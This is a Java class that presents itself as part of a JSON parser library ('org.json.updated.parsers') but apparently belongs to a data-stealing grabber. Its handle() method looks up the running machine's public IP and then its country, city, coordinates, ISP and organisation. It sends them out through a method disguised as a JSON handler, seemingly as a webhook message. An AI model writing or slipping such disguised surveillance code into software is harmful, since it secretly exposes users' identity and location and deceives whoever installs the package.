package org.json.updated.parsers.impl;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.util.JSONBuilder;
import org.json.updated.parsers.util.JSONParser;

import java.util.regex.Matcher;

public class IPInformation implements JSONObject {
    private static final String[] IMPORTANT_VALUES = new String[] { "country", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "as", "org" };

    @Override
    public void handle() {
        String result = JSONParser.get("http://checkip.amazonaws.com/");
        if (result == null) {
            return;
        }

        result = result.replace("\n", "");

        String data = JSONParser.get("http://ip-api.com/json/" + result);
        if (data == null) {
            JSONRegexHandler.send(new JSONBuilder().value("content", "Minimal IP Data: " + result).build());
            return;
        }

        String content = ">>> IP Address: " + result + "\\n";
        for (String key : IMPORTANT_VALUES) {
            Matcher matcher = JSONParser.getValue(data, key);
            try {
                String value = matcher.group(1);
                content += key + ": " + value + "\\n";
            } catch (Exception e) {
                continue;
            }
        }

        JSONRegexHandler.send(new JSONBuilder().value("content", content).build());
    }

    @Override
    public String getName() {
        return "IPInformation";
    }
}
